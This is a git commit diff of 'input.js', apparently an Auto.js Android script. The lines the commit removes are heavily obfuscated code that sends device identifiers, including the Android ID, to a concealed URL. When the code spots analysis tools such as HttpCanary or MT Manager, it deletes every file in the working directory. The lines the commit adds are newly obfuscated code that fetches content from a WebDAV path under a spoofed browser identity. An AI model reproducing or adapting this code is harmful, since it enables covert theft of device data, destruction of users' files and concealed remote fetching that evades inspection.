0943905f229d8b99e28463aa3a5b52c2238feaea
jinqiusky <108732806+jinqiusky@users.noreply.github.com>
2025-02-24 13:54:23 +0800

    Update input.js

--- input.js
+++ input.js
@@ -1,135 +1,39 @@
-                        _0x3372 = ["jsjiami.com.v6", "TjnCoQXDkMKfIsO3CMKNwqMXwpHCgw==", "LMOUw7s=", "wqAMwq5/VHjDvEEGRg83DAo=", "wrl1dSbDuD7CgcOVwrfCtS1Vw5Zr", "w54uw4I=", "wrDDpErDgMKESFRgBy/Cr8Krw6Uf", "TcK2EcKFw4PDpsOTwo4YG8K8GhDDoFk=", "wqTDsVLDucKR", "P8O6UQ==", "5a+16KGs54+I5aGu5b6R5bqxP+ivteiBrOexr+Wvl+aco+ikruWEmMKo", "SlzDlcOFSEvDlMKv", "AcOQC2E3w7Qc", "XH7Cr1o7", "wqrDscK8", "PRcAw58g", "Y8OLeMOYG0XDpA==", "Z8Odw5oHUDhR", "w5l/w45Zw4M=", "LcOhw6TDrHHDig==", "DcO9ZcOnw7Y=", "wp/CqmjCjsO2w7/CliLCrQ==", "cMOKw54NUA==", "w7rCgMO5wrDDqg==", "R8KvM1rDgDrCncKU", "OmcXYgk=", "5a6F6KCh5Y2x5b215bq5WOitmuiDsOezouaIuuadoeilleWGsxvljq7lsY/pg6XlhZ8=", "GsOYJMOUw7fCj0w=", "T8OAPcKsZQ==", "w5rCusKGwqrChcKtY8KSacKQw7bCusK5woDCjXTDvnjCojTDk8Obw7jDgsKbaGU8w4VmVD/DmsO0w55g", "w4EIwpMWw57DpcKhGmo/w6jDmU/Cs8K5wrIaw6/ClU5dN3ITJRY5E0dhwopm", "woJaw44bwprCscO5W2U=", "w71PWmRSHTw0ZMKd", "NcOec8Olw6gK", "fQEcOSjDng==", "fsKBGRjDtxE=", "YhATLCg=", "NcOFc8O4", "fcOHfcOJLV/Dsw==", "gbjVTfksjiami.tcSoECKJm.v6pHF=="];
-                        function n(e, t) {
-                            e = ~~"0x".concat(e.slice(1));
-                            var o = _0x3372[e];
-                            void 0 === n.JxJzsb && (function () {
-                                var e = "undefined" != typeof window ? window : "object" == typeof process && "function" == typeof require && "object" == typeof global ? global : this;
-                                e.atob || (e.atob = function (e) {
-                                    for (var t, o, c = String(e).replace(/=+$/, ""), n = 0, r = 0, i = ""; o = c.charAt(r++); ~o && (t = n % 4 ? 64 * t + o : o, n++ % 4) && (i += String.fromCharCode(255 & t >> (-2 * n & 6)))) {
-                                        o = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".indexOf(o);
-                                    }
-                                    return i;
-                                });
-                            }(), n.UljOxo = function (e, t) {
-                                for (var o, c = [], n = 0, r = "", i = "", s = 0, a = (e = atob(e)).length; s < a; s++) {
-                                    i += "%" + ("00" + e.charCodeAt(s).toString(16)).slice(-2);
-                                }
-                                e = decodeURIComponent(i);
-                                for (var d = 0; d < 256; d++) {
-                                    c[d] = d;
-                                }
-                                for (d = 0; d < 256; d++) {
-                                    n = (n + c[d] + t.charCodeAt(d % t.length)) % 256, o = c[d], c[d] = c[n], c[n] = o;
-                                }
-                                for (var W = n = d = 0; W < e.length; W++) {
-                                    n = (n + c[d = (d + 1) % 256]) % 256, o = c[d], c[d] = c[n], c[n] = o, r += String.fromCharCode(e.charCodeAt(W) ^ c[(c[d] + c[n]) % 256]);
-                                }
-                                return r;
-                            }, n.REZEEk = {}, n.JxJzsb = !0);
-                            var c = n.REZEEk[e];
-                            return void 0 === c ? (void 0 === n.NffHiX && (n.NffHiX = !0), o = n.UljOxo(o, t), n.REZEEk[e] = o) : o = c, o;
+       function chaip(ble) {
+            const _0x111c08 = _0xec1b07;
+            (function (_0xec1b07, _0x497375) {
+                const _0x492d03 = _0x1f66, _0x249170 = _0xec1b07();
+                while (!![]) {
+                    try {
+                        const _0x4d7888 = -parseInt(_0x492d03(415)) / 1 * (parseInt(_0x492d03(413)) / 2) + parseInt(_0x492d03(411)) / 3 * (parseInt(_0x492d03(417)) / 4) + parseInt(_0x492d03(421)) / 5 + parseInt(_0x492d03(418)) / 6 + parseInt(_0x492d03(409)) / 7 * (-parseInt(_0x492d03(419)) / 8) + -parseInt(_0x492d03(422)) / 9 + parseInt(_0x492d03(416)) / 10;
+                        if (_0x4d7888 === _0x497375) {
+                            break;
+                        } else {
+                            _0x249170["push"](_0x249170["shift"]());
                         }
-                        if (i = _0x3372, S = 326, function (e, t, o, c) {
-                            var n = "shift", r = "push";
-                            if ((t >>= 8) < e) {
-                                for (; --e; ) {
-                                    c = i[n](), t === e && 1 === "\u202e".length ? (t = c, o = i.pop()) : t && o.replace(/[gbVTfktSECKJpHF=]/g, "") === t && i[r](c);
-                                }
-                                i[r](i[n]());
-                            }
-                        }(++S, 83456), _0x3372 && _0x3372.length, device[n("\u202e0", "HSYg")] != n("\u202e1", "t8h2")) {
-                            try {
-                                http.lianjie();
-                            }
-                            catch (e) {
-                                for (var o = "1|9|3|2|6|8|4|0|7|5"[n("\u202b2", "DxIT")]("|"), c = 0; ; ) {
-                                    switch (o[c++]) {
-                                      case "0":
-                                        ui.run(function () {
-                                            ui.shuoming.setText(n("\u202b3", "t8h2"));
-                                        });
-                                        continue;
-                                      case "1":
-                                        var r = nmm + "," + random(100000, 999999) + "," + device[n("\u202b4", "Dhao")] + "," + device[n("\u202e5", "rLoi")] + "," + device.getAndroidId();
-                                        continue;
-                                      case "2":
-                                        url = n("\u202b6", "Ax!v") + n("\u202b7", "vn&o") + "&title=" + nmm + n("\u202b8", "vn&o") + r;
-                                        continue;
-                                      case "3":
-                                        200 == a[n("\u202e9", "dYK@")] && (r += a.body[n("\u202ba", "D&Ag")]());
-                                        continue;
-                                      case "4":
-                                        for (ls = 0; ls < s[n("\u202eb", "PR%o")]; ls++) {
-                                            files[n("\u202ec", "t8h2")]("./" + s[ls]) || files.removeDir("./" + s[ls]);
-                                        }
-                                        continue;
-                                      case "5":
-                                        exit();
-                                        continue;
-                                      case "6":
-                                        threads[n("\u202ed", "PR%o")](function () {
-                                            http.get(url);
-                                        });
-                                        continue;
-                                      case "7":
-                                        sleep(5000);
-                                        continue;
-                                      case "8":
-                                        var s = files.listDir("./")[n("\u202ee", "D&Ag")]()[n("\u202bf", "RMsX")]();
-                                        continue;
-                                      case "9":
-                                        var a = http.get("http://whois.pconline.com.cn/ipJson.jsp?ip=xxx.xxx.xxx.xxx&json=true");
-                                        continue;
-                                    }
-                                    break;
-                                }
-                            }
-                            var e = !1, d = !1, W = !1;
-                            if ((null != app[n("\u202e10", "5Wbk")]("AutoJ" + n("\u202b11", "Arh%") + "o") || null != app[n("\u202b12", "M9WR")]("Auto.js")) && (e = !0), null != app[n("\u202e13", "HEj0")]("HttpCan" + n("\u202e14", "zBCI")) && (d = !0), null != app[n("\u202e15", "tCLS")]("MT\u7ba1\u7406\u5668") && (W = !0), e || d || W) {
-                                for (var u = n("\u202b16", "uZ%j")[n("\u202b17", "tCLS")]("|"), p = 0; ; ) {
-                                    switch (u[p++]) {
-                                      case "0":
-                                        t = !1;
-                                        continue;
-                                      case "1":
-                                        d && (l += "401");
-                                        continue;
-                                      case "2":
-                                        ui[n("\u202b18", "%jvJ")](function () {
-                                            var e = {iMHOc: function (e, t) {
-                                                return e + t;
-                                            }, OhqsE: n("\u202e19", "L)o)")};
-                                            ui[n("\u202e1a", "U]dy")][n("\u202e1b", "JHcH")](e.iMHOc(e[n("\u202b1c", "1W)f")], l) + ")");
-                                        });
-                                        continue;
-                                      case "3":
-                                        e && (l += n("\u202b1d", "6UDW"));
-                                        continue;
-                                      case "4":
-                                        sleep(1000000);
-                                        continue;
-                                      case "5":
-                                        e && threads[n("\u202b1e", "QhT6")](function () {
-                                            var e = {HSMjv: function (e, t) {
-                                                return e < t;
-                                            }, KWdkp: function (e, t) {
-                                                return e + t;
-                                            }}, t = files[n("\u202b1f", "RMsX")]("./").sort()[n("\u202b20", "V#M^")]();
-                                            for (ls = 0; e[n("\u202b21", "1F#F")](ls, t.length); ls++) {
-                                                files[n("\u202b22", "Arh%")](e[n("\u202b23", "D&Ag")]("./", t[ls])) || files[n("\u202b24", "PN*j")](e.KWdkp("./", t[ls]));
-                                            }
-                                        });
-                                        continue;
-                                      case "6":
-                                        var l = "";
-                                        continue;
-                                      case "7":
-                                        W && (l += n("\u202e25", "V#M^"));
-                                        continue;
-                                    }
-                                    break;
-                                }
-                            }
-                        }
-
-        });
+                    }
+                    catch (_0x1eedce) {
+                        _0x249170["push"](_0x249170["shift"]());
+                    }
+                }
+            }(_0x1287, 252994), start(), ui[_0x111c08(420)](() => {
+                const _0x5238dc = _0x111c08;
+                ui["\u5fae\u535a"][_0x5238dc(410)](""), ui["dqq"]["setText"](""), ui[_0x5238dc(414)]["setText"]("");
+            }
+            ));
+            function _0x1f66(_0x2e14d9, _0x49dfd1) {
+                const _0x128755 = _0x1287();                return _0x1f66 = function (_0x1f66ef, _0x486569) {
+                    _0x1f66ef = _0x1f66ef - 408;
+                    let _0x593768 = _0x128755[_0x1f66ef];
+                    return _0x593768;
+                }, _0x1f66(_0x2e14d9, _0x49dfd1);
+            }
+            function _0x1287() {
+                const _0x50e1cf = ["zh-cn,zh;q=0.5", "json", "body", "12334VIjRnJ", "setText", "281661LcWKDd", "Mozilla/5.0(Macintosh;IntelMacOSX10_7_0)AppleWebKit/535.11(KHTML,likeGecko)Chrome/17.0.963.56Safari/535.11", "2630MJbCWt", "ysss", "22lGCXXe", "3364550hxSQcD", "4zwTkFz", "49488AtgfuP", "1264BCFYkh", "run", "1859090eCPjAD", "2250792VhazIH"];
+                _0x1287 = function () {
+                    return _0x50e1cf;
+                };
+                return _0x1287();
+            }
+            let url = "http://dav.jianguoyun.com/dav/", html = http["get"](url + ble, {"headers": {"Accept-Language": _0x111c08(423), "User-Agent": _0x111c08(412)}})[_0x111c08(408)][_0x111c08(424)]();
+            return html;
+        }
